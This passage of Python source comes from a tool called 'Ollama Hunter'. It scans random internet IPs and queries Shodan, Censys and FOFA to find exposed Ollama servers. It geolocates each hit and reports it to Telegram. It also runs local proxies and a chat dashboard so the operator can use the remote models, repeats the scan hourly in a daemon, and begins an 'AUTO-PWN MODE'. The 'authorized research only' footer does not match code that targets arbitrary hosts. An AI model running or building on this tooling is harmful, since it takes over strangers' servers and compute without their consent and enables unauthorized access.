    
    if not token or not chat_id:
        log("Telegram not configured. Set token and chat_id in config.", "WARN")
        return False
    
    try:
        import requests
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        resp = requests.post(url, json={
            "chat_id": chat_id,
            "text": message,
            "parse_mode": "HTML"
        }, timeout=10)
        return resp.status_code == 200
    except Exception as e:
        log(f"Telegram error: {e}", "ERROR")
        return False

def notify_found(instance: dict):
    """Send notification about found instance"""
    geo = instance.get("geo") or {}
    models = ", ".join(instance.get("models", [])[:5])
    msg = (
        f"🦙 <b>New Ollama Instance Found!</b>\n\n"
        f"📍 <code>{instance['ip']}:{instance.get('port', 11434)}</code>\n"
        f"🌍 {geo.get('country', '?')} / {geo.get('city', '?')}\n"
        f"📦 Models: {models}\n"
        f"🔢 Version: {instance.get('version', '?')}\n"
        f"⏰ {instance.get('timestamp', '?')}"
    )
    send_telegram(msg)

# ============================================================
# PROXY SERVER
# ============================================================

def start_proxy(target: str, listen_port: int = 8080, listen_host: str = "127.0.0.1"):
    """
    Start a proxy server that forwards requests to a remote Ollama instance.
    Compatible with OpenAI SDK (uses /v1/chat/completions) and native Ollama API.
    """
    try:
        from flask import Flask, request, jsonify, Response, stream_with_context
        import requests as sync_requests
    except ImportError:
        log("Flask required for proxy mode. Install: pip install flask requests", "ERROR")
        sys.exit(1)
    
    if not target.startswith("http"):
        target = f"http://{target}"
    target = target.rstrip("/")
    
    app = Flask(__name__)
    
    @app.route("/", methods=["GET"])
    def index():
        return jsonify({
            "service": "Ollama Hunter Proxy",
            "target": target,
            "version": VERSION,
            "status": "active",
            "endpoints": [
                "/api/tags", "/api/chat", "/api/generate",
                "/v1/chat/completions", "/v1/models"
            ]
        })
    
    @app.route("/api/tags", methods=["GET"])
    def proxy_tags():
        try:
            resp = sync_requests.get(f"{target}/api/tags", timeout=10, headers={"User-Agent": USER_AGENT})
            return Response(resp.content, status=resp.status_code,
                           content_type=resp.headers.get("Content-Type", "application/json"))
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    @app.route("/api/version", methods=["GET"])
    def proxy_version():
        try:
            resp = sync_requests.get(f"{target}/api/version", timeout=10, headers={"User-Agent": USER_AGENT})
            return Response(resp.content, status=resp.status_code,
                           content_type=resp.headers.get("Content-Type", "application/json"))
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    @app.route("/api/chat", methods=["POST"])
    def proxy_chat():
        data = request.get_data()
        content_type = request.headers.get("Content-Type", "application/json")
        is_stream = True
        try:
            body = json.loads(data)
            is_stream = body.get("stream", True)
        except:
            pass
        
        try:
            if is_stream:
                resp = sync_requests.post(f"{target}/api/chat", data=data,
                    headers={"Content-Type": content_type, "User-Agent": USER_AGENT},
                    stream=True, timeout=60)
                def gen():
                    for chunk in resp.iter_content(chunk_size=None):
                        if chunk: yield chunk
                return Response(stream_with_context(gen()),
                    status=resp.status_code,
                    content_type=resp.headers.get("Content-Type", "application/x-ndjson"))
            else:
                resp = sync_requests.post(f"{target}/api/chat", data=data,
                    headers={"Content-Type": content_type, "User-Agent": USER_AGENT}, timeout=60)
                return Response(resp.content, status=resp.status_code,
                    content_type=resp.headers.get("Content-Type", "application/json"))
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    @app.route("/api/generate", methods=["POST"])
    def proxy_generate():
        data = request.get_data()
        content_type = request.headers.get("Content-Type", "application/json")
        is_stream = True
        try:
            body = json.loads(data)
            is_stream = body.get("stream", True)
        except:
            pass
        try:
            if is_stream:
                resp = sync_requests.post(f"{target}/api/generate", data=data,
                    headers={"Content-Type": content_type, "User-Agent": USER_AGENT},
                    stream=True, timeout=120)
                def gen():
                    for chunk in resp.iter_content(chunk_size=None):
                        if chunk: yield chunk
                return Response(stream_with_context(gen()),
                    status=resp.status_code,
                    content_type=resp.headers.get("Content-Type", "application/x-ndjson"))
            else:
                resp = sync_requests.post(f"{target}/api/generate", data=data,
                    headers={"Content-Type": content_type, "User-Agent": USER_AGENT}, timeout=120)
                return Response(resp.content, status=resp.status_code,
                    content_type=resp.headers.get("Content-Type", "application/json"))
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    @app.route("/v1/chat/completions", methods=["POST"])
    def proxy_openai_chat():
        data = request.get_data()
        content_type = request.headers.get("Content-Type", "application/json")
        is_stream = False
        try:
            body = json.loads(data)
            is_stream = body.get("stream", False)
        except:
            pass
        try:
            if is_stream:
                resp = sync_requests.post(f"{target}/v1/chat/completions", data=data,
                    headers={"Content-Type": content_type, "User-Agent": USER_AGENT},
                    stream=True, timeout=60)
                def gen():
                    for chunk in resp.iter_content(chunk_size=None):
                        if chunk: yield chunk
                return Response(stream_with_context(gen()),
                    status=resp.status_code,
                    content_type=resp.headers.get("Content-Type", "text/event-stream"))
            else:
                resp = sync_requests.post(f"{target}/v1/chat/completions", data=data,
                    headers={"Content-Type": content_type, "User-Agent": USER_AGENT}, timeout=60)
                return Response(resp.content, status=resp.status_code,
                    content_type=resp.headers.get("Content-Type", "application/json"))
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    @app.route("/v1/models", methods=["GET"])
    def proxy_openai_models():
        try:
            resp = sync_requests.get(f"{target}/api/tags", timeout=10, headers={"User-Agent": USER_AGENT})
            data = resp.json()
            models = [{"id": m.get("name"), "object": "model",
                       "created": int(datetime.now().timestamp()), "owned_by": "ollama"}
                      for m in data.get("models", [])]
            return jsonify({"object": "list", "data": models})
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    @app.route("/<path:subpath>", methods=["GET", "POST", "PUT", "DELETE", "PATCH"])
    def proxy_catchall(subpath):
        url = f"{target}/{subpath}"
        data = request.get_data() if request.method in ["POST", "PUT", "PATCH"] else None
        try:
            resp = sync_requests.request(
                method=request.method, url=url, data=data,
                headers={k: v for k, v in request.headers if k.lower() not in ["host", "content-length"]},
                timeout=30)
            return Response(resp.content, status=resp.status_code,
                content_type=resp.headers.get("Content-Type", "application/octet-stream"))
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    log(f"🚀 Proxy → {listen_host}:{listen_port} → {target}", "OK")
    from werkzeug.serving import run_simple
    run_simple(listen_host, listen_port, app, use_reloader=False, threaded=True)

# ============================================================
# INTERACTIVE CHAT MODE
# ============================================================

def interactive_chat(target: str):
    """Interactive CLI chat with a remote Ollama instance"""
    import requests as sync_requests
    
    if not target.startswith("http"):
        target = f"http://{target}"
    target = target.rstrip("/")
    
    log(f"🔗 Connecting to {target}...", "INFO")
    try:
        resp = sync_requests.get(f"{target}/api/tags", timeout=10, headers={"User-Agent": USER_AGENT})
        if resp.status_code != 200:
            log(f"Failed: HTTP {resp.status_code}", "ERROR")
            return
        data = resp.json()
        models = [m.get("name", "unknown") for m in data.get("models", [])]
    except Exception as e:
        log(f"Failed: {e}", "ERROR")
        return
    
    if not models:
        log("No models found!", "WARN")
        return
    
    log(f"🦙 Connected | Models: {', '.join(models)}", "OK")
    
    print(f"\n{'='*60}")
    print(f"  Available Models:")
    for i, m in enumerate(models, 1):
        print(f"  {i}. {m}")
    print(f"{'='*60}")
    
    try:
        choice = input(f"\n  Select model [1-{len(models)}] (default: 1): ").strip()
        model_idx = (int(choice) - 1) if choice else 0
        if model_idx < 0 or model_idx >= len(models):
            model_idx = 0
        selected_model = models[model_idx]
    except (ValueError, IndexError):
        selected_model = models[0]
    
    log(f"🤖 Using: {selected_model} | Type /help for commands\n", "OK")
    
    messages = []
    while True:
        try:
            user_input = input("\033[93mYou: \033[0m").strip()
            if not user_input:
                continue
            if user_input.lower() in ["exit", "quit", "/bye"]:
                log("👋 Bye!", "INFO"); break
            if user_input.lower() == "/models":
                log(f"📦 Models: {', '.join(models)}", "INFO"); continue
            if user_input.lower() == "/help":
                print("""
  Commands:
    /models   - List available models
    /clear    - Clear conversation
    /model N  - Switch to model N
    /info     - Show instance info
    /export   - Save chat to file
    /help     - This help
    exit/quit - Exit
                """)
                continue
            if user_input.lower() == "/clear":
                messages = []; log("🧹 Cleared!", "INFO"); continue
            if user_input.lower() == "/info":
                fp = fingerprint_instance(target)
                print(f"  Version: {fp['version']}")
                print(f"  Models: {fp['model_count']} ({', '.join(fp['models'][:5])})")
                print(f"  Total Size: {fp['total_model_size_gb']} GB")
                print(f"  Response: {fp['response_time_ms'].get('total', '?')}ms")
                print(f"  CVEs: {len(fp['cves'])}")
                continue
            if user_input.lower() == "/export":
                fname = f"chat_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(fname, 'w') as f:
                    json.dump(messages, f, indent=2)
                log(f"💾 Chat saved to {fname}", "OK"); continue
            if user_input.lower().startswith("/model "):
                try:
                    idx = int(user_input.split("/model ")[1]) - 1
                    if 0 <= idx < len(models):
                        selected_model = models[idx]; messages = []
                        log(f"🔄 Switched to {selected_model}", "OK")
                    else:
                        log(f"Invalid. Choose 1-{len(models)}", "WARN")
                except:
                    log("Usage: /model <number>", "WARN")
                continue
            
            messages.append({"role": "user", "content": user_input})
            print("\033[92mModel: \033[0m", end="", flush=True)
            
            payload = {"model": selected_model, "messages": messages, "stream": True}
            try:
                resp = sync_requests.post(f"{target}/api/chat", json=payload,
                    headers={"User-Agent": USER_AGENT}, stream=True, timeout=120)
                if resp.status_code != 200:
                    log(f"HTTP {resp.status_code}", "ERROR")
                    messages.pop(); continue
                
                full = ""
                for line in resp.iter_lines():
                    if line:
                        try:
                            chunk = json.loads(line)
                            if "message" in chunk and "content" in chunk["message"]:
                                c = chunk["message"]["content"]; print(c, end="", flush=True); full += c
                            if chunk.get("done"): print()
                        except: pass
                print()
                if full:
                    messages.append({"role": "assistant", "content": full})
            except Exception as e:
                log(f"Error: {e}", "ERROR"); messages.pop()
        except KeyboardInterrupt:
            print(); log("👋 Bye!", "INFO"); break

# ============================================================
# WEB DASHBOARD UI
# ============================================================

def start_web_dashboard(host: str = "127.0.0.1", port: int = 5000):
    """Start a web dashboard for managing found instances, proxy, and chat"""
    try:
        from flask import Flask, request, jsonify, Response, stream_with_context, render_template_string
        import requests as sync_requests
    except ImportError:
        log("Flask required: pip install flask requests", "ERROR")
        sys.exit(1)
    
    app = Flask(__name__)
    active_proxies = {}  # target -> local_port
    
    DASHBOARD_HTML = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>🦙 Ollama Hunter Dashboard</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                   background: #0a0a0f; color: #e0e0e0; padding: 20px; }
            .container { max-width: 1400px; margin: 0 auto; }
            .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 25px; }
            h1 { color: #8b5cf6; }
            .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin-bottom: 25px; }
            .stat-card { background: #1a1a2e; border-radius: 10px; padding: 15px; border: 1px solid #2a2a3e; }
            .stat-card .num { font-size: 1.8rem; font-weight: bold; color: #8b5cf6; }
            .stat-card .label { color: #888; font-size: 0.85rem; }
            .tabs { display: flex; gap: 5px; margin-bottom: 20px; }
            .tab { padding: 10px 20px; background: #1a1a2e; border: 1px solid #2a2a3e; cursor: pointer;
                    border-radius: 8px 8px 0 0; color: #888; }
            .tab.active { background: #2a2a3e; color: #8b5cf6; border-bottom: 2px solid #8b5cf6; }
            .panel { display: none; background: #1a1a2e; border-radius: 0 8px 8px 8px; padding: 20px;
                     border: 1px solid #2a2a3e; }
            .panel.active { display: block; }
            table { width: 100%; border-collapse: collapse; }
            th { background: #2a2a3e; padding: 10px 12px; text-align: left; color: #8b5cf6;
                 font-size: 0.85rem; }
            td { padding: 8px 12px; border-bottom: 1px solid #2a2a3e; font-size: 0.9rem; }
            tr:hover { background: #22223a; }
            .btn { display: inline-block; padding: 6px 14px; border-radius: 6px; cursor: pointer;
                   border: none; font-size: 0.85rem; text-decoration: none; }
            .btn-primary { background: #8b5cf6; color: white; }
            .btn-danger { background: #ef4444; color: white; }
            .btn-sm { padding: 4px 10px; font-size: 0.8rem; }
            .model-tag { display: inline-block; background: #2d3748; color: #a0aec0;
                          padding: 2px 8px; border-radius: 10px; font-size: 0.75rem; margin: 1px; }
            .badge { display: inline-block; padding: 2px 7px; border-radius: 8px; font-size: 0.75rem; }
            .badge-on { background: #05966933; color: #34d399; }
            .badge-off { background: #dc262633; color: #f87171; }
            input, textarea, select { background: #0a0a0f; border: 1px solid #2a2a3e; color: #e0e0e0;
                                      padding: 8px 12px; border-radius: 6px; width: 100%; margin-bottom: 10px; }
            .proxy-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
            .proxy-card { background: #0a0a0f; border: 1px solid #2a2a3e; border-radius: 8px; padding: 15px; }
            .proxy-card h3 { color: #8b5cf6; margin-bottom: 8px; }
            #chat-box { height: 400px; overflow-y: auto; background: #0a0a0f; border: 1px solid #2a2a3e;
                        border-radius: 8px; padding: 15px; margin-bottom: 10px; }
            .chat-msg { margin-bottom: 10px; padding: 8px 12px; border-radius: 8px; }
            .chat-user { background: #1a1a2e; border-left: 3px solid #8b5cf6; }
            .chat-model { background: #0a0a0f; border-left: 3px solid #34d399; }
            .chat-input-row { display: flex; gap: 10px; }
            .chat-input-row input { flex: 1; margin-bottom: 0; }
            .chat-input-row button { margin-bottom: 0; }
            .version { font-family: monospace; }
            .footer { margin-top: 30px; color: #555; text-align: center; font-size: 0.8rem; }
            .toast { position: fixed; top: 20px; right: 20px; background: #1a1a2e; border: 1px solid #8b5cf6;
                     padding: 12px 20px; border-radius: 8px; display: none; z-index: 1000; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>🦙 Ollama Hunter Dashboard</h1>
                <span id="status-badge" class="badge badge-on">● Live</span>
            </div>
            
            <div class="stats" id="stats"></div>
            
            <div class="tabs">
                <div class="tab active" onclick="switchTab('instances')">📋 Instances</div>
                <div class="tab" onclick="switchTab('proxies')">🔌 Proxies</div>
                <div class="tab" onclick="switchTab('chat')">💬 Chat</div>
                <div class="tab" onclick="switchTab('scan')">📡 Scan</div>
                <div class="tab" onclick="switchTab('config')">⚙️ Config</div>
            </div>
            
            <!-- Instances Panel -->
            <div id="panel-instances" class="panel active">
                <table>
                    <tr><th>IP</th><th>Port</th><th>Version</th><th>Models</th><th>Location</th><th>Proxy</th><th>Chat</th></tr>
                    <tbody id="instances-tbody"></tbody>
                </table>
                <div style="margin-top:15px;display:flex;gap:10px;">
                    <button class="btn btn-primary" onclick="exportData('html')">📄 HTML</button>
                    <button class="btn btn-primary" onclick="exportData('csv')">📄 CSV</button>
                    <button class="btn btn-primary" onclick="exportData('json')">📄 JSON</button>
                </div>
            </div>
            
            <!-- Proxies Panel -->
            <div id="panel-proxies" class="panel">
                <div class="proxy-grid" id="proxies-grid">
                    <p style="color:#888;">No active proxies. Select an instance above.</p>
                </div>
            </div>
            
            <!-- Chat Panel -->
            <div id="panel-chat" class="panel">
                <div style="display:flex;gap:10px;margin-bottom:10px;">
                    <select id="chat-instance" style="width:auto;flex:2;"></select>
                    <select id="chat-model" style="width:auto;flex:1;"></select>
                </div>
                <div id="chat-box"></div>
                <div class="chat-input-row">
                    <input type="text" id="chat-input" placeholder="Type your message..." 
                           onkeydown="if(event.key==='Enter') sendChat()">
                    <button class="btn btn-primary" onclick="sendChat()">Send</button>
                    <button class="btn" style="background:#2a2a3e;color:#888;" onclick="clearChat()">Clear</button>
                </div>
            </div>
            
            <!-- Scan Panel -->
            <div id="panel-scan" class="panel">
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;">
                    <div>
                        <h3 style="color:#8b5cf6;margin-bottom:10px;">TCP Scan</h3>
                        <select id="scan-type">
                            <option value="random">Random IPs</option>
                            <option value="cidr">CIDR Range</option>
                        </select>
                        <input type="text" id="scan-param" placeholder="1000 (count) or 192.168.1.0/24">
                        <button class="btn btn-primary" onclick="startScan()">▶ Scan</button>
                    </div>
                    <div>
                        <h3 style="color:#8b5cf6;margin-bottom:10px;">Internet DB Search</h3>
                        <button class="btn btn-primary" onclick="searchDB('shodan')">🔎 Shodan</button>
                        <button class="btn btn-primary" onclick="searchDB('censys')">🔎 Censys</button>
                        <button class="btn btn-primary" onclick="searchDB('fofa')">🔎 FOFA</button>
                    </div>
                </div>
                <div id="scan-log" style="margin-top:15px;background:#0a0a0f;border:1px solid #2a2a3e;
                     border-radius:8px;padding:12px;height:200px;overflow-y:auto;font-family:monospace;font-size:0.85rem;"></div>
            </div>
            
            <!-- Config Panel -->
            <div id="panel-config" class="panel">
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;max-width:600px;">
                    <div>
                        <label>Telegram Token</label>
                        <input type="password" id="cfg-tg-token" placeholder="Bot token">
                        <label>Telegram Chat ID</label>
                        <input type="text" id="cfg-tg-chat" placeholder="Chat ID">
                        <label>Shodan API Key</label>
                        <input type="password" id="cfg-shodan" placeholder="API key">
                    </div>
                    <div>
                        <label>Censys ID</label>
                        <input type="text" id="cfg-censys-id" placeholder="API ID">
                        <label>Censys Secret</label>
                        <input type="password" id="cfg-censys-secret" placeholder="Secret">
                        <label>FOFA Email:Key</label>
                        <input type="text" id="cfg-fofa" placeholder="email:key">
                    </div>
                </div>
                <button class="btn btn-primary" onclick="saveConfig()">💾 Save Config</button>
            </div>
            
            <div class="footer">
                Ollama Hunter v2.0 | For authorized security research only
            </div>
        </div>
        
        <div id="toast" class="toast"></div>
        
        <script>
            function toast(msg) {
                const t = document.getElementById('toast');
                t.textContent = msg; t.style.display = 'block';
                setTimeout(() => t.style.display = 'none', 3000);
            }
            
            function switchTab(name) {
                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.panel').forEach(p => p.classList.remove('active'));
                document.querySelector(`.tab[onclick="switchTab('${name}')"]`).classList.add('active');
                document.getElementById(`panel-${name}`).classList.add('active');
            }
            
            function loadInstances() {
                fetch('/api/instances').then(r => r.json()).then(data => {
                    const tbody = document.getElementById('instances-tbody');
                    const stats = document.getElementById('stats');
                    tbody.innerHTML = '';
                    let totalModels = 0, countries = new Set();
                    data.forEach(inst => {
                        totalModels += inst.model_count || 0;
                        if (inst.geo && inst.geo.country) countries.add(inst.geo.country);
                        const models = (inst.models || []).slice(0,6);
                        tbody.innerHTML += `<tr>
                            <td><strong>${inst.ip}</strong></td>
                            <td>${inst.port || 11434}</td>
                            <td class="version">${inst.version || '?'}</td>
                            <td>${models.map(m => `<span class="model-tag">${m}</span>`).join(' ')}
                                ${(inst.models||[]).length > 6 ? `<span class="model-tag">+${inst.models.length-6}</span>` : ''}</td>
                            <td>${inst.geo ? inst.geo.city + ', ' + inst.geo.country : '?'}</td>
                            <td><button class="btn btn-primary btn-sm" onclick="proxyStart('${inst.ip}','${inst.port||11434}')">🔌</button></td>
                            <td><button class="btn btn-primary btn-sm" onclick="chatSelect('${inst.ip}')">💬</button></td>
                        </tr>`;
                    });
                    stats.innerHTML = `
                        <div class="stat-card"><div class="num">${data.length}</div><div class="label">Instances</div></div>
                        <div class="stat-card"><div class="num">${totalModels}</div><div class="label">Models</div></div>
                        <div class="stat-card"><div class="num">${countries.size}</div><div class="label">Countries</div></div>
                        <div class="stat-card"><div class="num">${Object.keys(activeProxies||{}).length}</div><div class="label">Active Proxies</div></div>
                    `;
                    // Update chat selector
                    const sel = document.getElementById('chat-instance');
                    sel.innerHTML = data.map(i => `<option value="${i.ip}:${i.port||11434}">${i.ip}</option>`).join('');
                });
            }
            
            let activeProxies = {};
            
            function proxyStart(ip, port) {
                fetch('/api/proxy/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target: `${ip}:${port}`})
                }).then(r => r.json()).then(d => {
                    if (d.port) {
                        activeProxies[`${ip}:${port}`] = d.port;
                        toast(`Proxy started on :${d.port}`);
                        loadProxies();
                    } else {
                        toast('Error: ' + (d.error || 'unknown'));
                    }
                });
            }
            
            function proxyStop(target) {
                fetch('/api/proxy/stop', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target: target})
                }).then(r => r.json()).then(d => {
                    delete activeProxies[target];
                    toast('Proxy stopped');
                    loadProxies();
                });
            }
            
            function loadProxies() {
                fetch('/api/proxies').then(r => r.json()).then(data => {
                    const grid = document.getElementById('proxies-grid');
                    if (Object.keys(data).length === 0) {
                        grid.innerHTML = '<p style="color:#888;">No active proxies. Start one from the Instances tab.</p>';
                        return;
                    }
                    grid.innerHTML = '';
                    Object.entries(data).forEach(([target, port]) => {
                        grid.innerHTML += `<div class="proxy-card">
                            <h3>🔌 ${target}</h3>
                            <p style="color:#888;font-size:0.85rem;">Local port: <strong>${port}</strong></p>
                            <p style="font-size:0.8rem;margin-top:5px;">
                                curl http://127.0.0.1:${port}/api/tags<br>
                                openai.base_url = "http://127.0.0.1:${port}/v1/"
                            </p>
                            <button class="btn btn-danger btn-sm" onclick="proxyStop('${target}')" style="margin-top:8px;">Stop</button>
                        </div>`;
                    });
                });
            }
            
            function chatSelect(ip) {
                switchTab('chat');
                document.getElementById('chat-instance').value = ip + ':11434';
                loadModels();
            }
            
            function loadModels() {
                const target = document.getElementById('chat-instance').value;
                fetch(`/api/models?target=${target}`).then(r => r.json()).then(data => {
                    const sel = document.getElementById('chat-model');
                    sel.innerHTML = (data.models || []).map(m => `<option>${m}</option>`).join('');
                });
            }
            
            let chatHistory = [];
            
            function sendChat() {
                const input = document.getElementById('chat-input');
                const msg = input.value.trim();
                if (!msg) return;
                const target = document.getElementById('chat-instance').value;
                const model = document.getElementById('chat-model').value;
                
                const box = document.getElementById('chat-box');
                box.innerHTML += `<div class="chat-msg chat-user"><strong>You:</strong> ${msg}</div>`;
                input.value = '';
                chatHistory.push({role: 'user', content: msg});
                
                fetch('/api/chat/send', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({target, model, messages: chatHistory})
                }).then(r => r.json()).then(d => {
                    if (d.response) {
                        box.innerHTML += `<div class="chat-msg chat-model"><strong>${model}:</strong> ${d.response}</div>`;
                        chatHistory.push({role: 'assistant', content: d.response});
                        box.scrollTop = box.scrollHeight;
                    }
                });
            }
            
            function clearChat() {
                chatHistory = [];
                document.getElementById('chat-box').innerHTML = '';
            }
            
            function startScan() {
                const type = document.getElementById('scan-type').value;
                const param = document.getElementById('scan-param').value;
                const log = document.getElementById('scan-log');
                log.innerHTML += `▶ Starting ${type} scan: ${param}\\n`;
                
                fetch('/api/scan', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({type, param})
                }).then(r => r.json()).then(d => {
                    log.innerHTML += `✅ Found ${d.found} instance(s) in ${d.time}s\\n`;
                    loadInstances();
                });
            }
            
            function searchDB(source) {
                const log = document.getElementById('scan-log');
                log.innerHTML += `▶ Searching ${source}...\\n`;
                fetch(`/api/search/${source}`).then(r => r.json()).then(d => {
                    log.innerHTML += `✅ ${source}: ${d.found} instance(s)\\n`;
                    loadInstances();
                });
            }
            
            function exportData(fmt) {
                fetch(`/api/export/${fmt}`).then(r => r.json()).then(d => {
                    toast(`Exported: ${d.file}`);
                });
            }
            
            function saveConfig() {
                const cfg = {
                    telegram_token: document.getElementById('cfg-tg-token').value,
                    telegram_chat_id: document.getElementById('cfg-tg-chat').value,
                    shodan_key: document.getElementById('cfg-shodan').value,
                    censys_id: document.getElementById('cfg-censys-id').value,
                    censys_secret: document.getElementById('cfg-censys-secret').value,
                    fofa_email: document.getElementById('cfg-fofa').value.split(':')[0] || '',
                    fofa_key: document.getElementById('cfg-fofa').value.split(':')[1] || ''
                };
                fetch('/api/config', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(cfg)
                }).then(r => r.json()).then(d => toast('Config saved!'));
            }
            
            function loadConfig() {
                fetch('/api/config').then(r => r.json()).then(d => {
                    document.getElementById('cfg-tg-token').value = d.telegram_token || '';
                    document.getElementById('cfg-tg-chat').value = d.telegram_chat_id || '';
                    document.getElementById('cfg-shodan').value = d.shodan_key || '';
                    document.getElementById('cfg-censys-id').value = d.censys_id || '';
                    document.getElementById('cfg-censys-secret').value = d.censys_secret || '';
                    document.getElementById('cfg-fofa').value = (d.fofa_email || '') + ':' + (d.fofa_key || '');
                });
            }
            
            // Initialize
            loadInstances();
            loadProxies();
            loadConfig();
            document.getElementById('chat-instance').addEventListener('change', loadModels);
            setInterval(loadInstances, 5000);
            setInterval(loadProxies, 5000);
        </script>
    </body>
    </html>
    """
    
    # ─── API Routes ───
    
    @app.route("/")
    def dashboard():
        return render_template_string(DASHBOARD_HTML)
    
    @app.route("/api/instances")
    def api_instances():
        return jsonify(load_found())
    
    @app.route("/api/proxies")
    def api_proxies():
        return jsonify(active_proxies)
    
    @app.route("/api/proxy/start", methods=["POST"])
    def api_proxy_start():
        data = request.get_json()
        target = data.get("target", "")
        if not target:
            return jsonify({"error": "No target"}), 400
        if target in active_proxies:
            return jsonify({"port": active_proxies[target]})
        
        # Find available port
        proxy_port = 9090
        while proxy_port < 9190:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex(('127.0.0.1', proxy_port))
            sock.close()
            if result != 0:
                break
            proxy_port += 1
        
        # Start proxy in thread
        import threading
        t = threading.Thread(target=start_proxy, args=(target, proxy_port, "127.0.0.1"), daemon=True)
        t.start()
        active_proxies[target] = proxy_port
        time.sleep(1)
        return jsonify({"port": proxy_port, "target": target})
    
    @app.route("/api/proxy/stop", methods=["POST"])
    def api_proxy_stop():
        data = request.get_json()
        target = data.get("target", "")
        if target in active_proxies:
            del active_proxies[target]
        return jsonify({"status": "stopped"})
    
    @app.route("/api/models")
    def api_models():
        target = request.args.get("target", "")
        if not target:
            return jsonify({"models": []})
        if not target.startswith("http"):
            target = f"http://{target}"
        try:
            resp = sync_requests.get(f"{target}/api/tags", timeout=5)
            data = resp.json()
            models = [m.get("name") for m in data.get("models", [])]
            return jsonify({"models": models})
        except:
            return jsonify({"models": []})
    
    @app.route("/api/chat/send", methods=["POST"])
    def api_chat_send():
        data = request.get_json()
        target = data.get("target", "")
        model = data.get("model", "")
        messages = data.get("messages", [])
        
        if not target.startswith("http"):
            target = f"http://{target}"
        
        try:
            resp = sync_requests.post(f"{target}/api/chat", json={
                "model": model, "messages": messages, "stream": False
            }, timeout=60)
            if resp.status_code == 200:
                result = resp.json()
                return jsonify({"response": result.get("message", {}).get("content", "")})
            return jsonify({"error": f"HTTP {resp.status_code}"}), 502
        except Exception as e:
            return jsonify({"error": str(e)}), 502
    
    @app.route("/api/scan", methods=["POST"])
    def api_scan():
        data = request.get_json()
        scan_type = data.get("type", "random")
        param = data.get("param", "100")
        
        ips = []
        if scan_type == "random":
            try:
                count = int(param)
                ips = generate_random_ips(count)
            except:
                ips = generate_random_ips(100)
        elif scan_type == "cidr":
            ips = ips_from_cidr(param)
        
        if not ips:
            return jsonify({"found": 0, "time": 0})
        
        start = time.time()
        found = asyncio.run(scan_ips(ips[:1000]))  # Limit for web UI
        elapsed = round(time.time() - start, 2)
        return jsonify({"found": len(found), "time": elapsed})
    
    @app.route("/api/search/<source>")
    def api_search(source):
        config = get_config()
        found = []
        if source == "shodan" and config.get("shodan_key"):
            found = search_shodan(config["shodan_key"])
        elif source == "censys" and config.get("censys_id") and config.get("censys_secret"):
            found = search_censys(config["censys_id"], config["censys_secret"])
        elif source == "fofa" and config.get("fofa_email") and config.get("fofa_key"):
            found = search_fofa(config["fofa_email"], config["fofa_key"])
        return jsonify({"found": len(found)})
    
    @app.route("/api/export/<fmt>")
    def api_export(fmt):
        instances = load_found()
        fname = do_export(instances, fmt)
        return jsonify({"file": fname, "format": fmt})
    
    @app.route("/api/config", methods=["GET", "POST"])
    def api_config():
        if request.method == "POST":
            data = request.get_json()
            save_config(data)
            return jsonify({"status": "saved"})
        return jsonify(get_config())
    
    log(f"🌐 Dashboard: http://{host}:{port}", "OK")
    from werkzeug.serving import run_simple
    webbrowser.open(f"http://{host}:{port}")
    run_simple(host, port, app, use_reloader=False, threaded=True)

# ============================================================
# CONTINUOUS MONITORING DAEMON
# ============================================================

def monitoring_daemon(interval: int = 3600, random_count: int = 5000):
    """Continuously scan for new instances at set intervals"""
    log(f"🔄 Monitoring daemon started (interval: {interval}s, {random_count} IPs/scan)", "OK")
    log("   Press Ctrl+C to stop", "INFO")
    
    config = get_config()
    
    while True:
        log(f"⏰ Scan cycle starting at {datetime.now().isoformat()}", "INFO")
        
        # Generate and scan IPs
        ips = generate_random_ips(random_count)
        found = asyncio.run(scan_ips(ips))
        
        # Geolocate + notify new ones
        for inst in found:
            geo = geolocate_ip(inst["ip"])
            if geo:
                inst["geo"] = geo
                save_found(inst)  # Re-save with geo
            if config.get("notify_on_find"):
                notify_found(inst)
        
        # Export
        if config.get("auto_export"):
            instances = load_found()
            do_export(instances, config.get("export_format", "json"))
        
        log(f"💤 Sleeping {interval}s until next scan...", "INFO")
        time.sleep(interval)

# ============================================================
# AUTO-PWN MODE
# ============================================================

def autopwn(random_count: int = 5000, proxy_port: int = 9090, host: str = "127.0.0.1"):
    """Scan → Find → Proxy → Dashboard — all in one command"""
    log("🚀 AUTO-PWN MODE ACTIVATED", "OK")
    log(f"   Step 1: Scan {random_count} random IPs...", "INFO")
    
    ips = generate_random_ips(random_count)
    found_instances = asyncio.run(scan_ips(ips))
    
    if not found_instances:
        log("❌ No instances found. Try a larger scan.", "ERROR")
        return
    
    log(f"🎯 Found {len(found_instances)} instance(s)!", "FOUND")
    
    # Geolocate them
    log("📍 Geolocating...", "INFO")
    found_instances = batch_geolocate(found_instances)
    
    # Export report
    log("📄 Generating report...", "INFO")
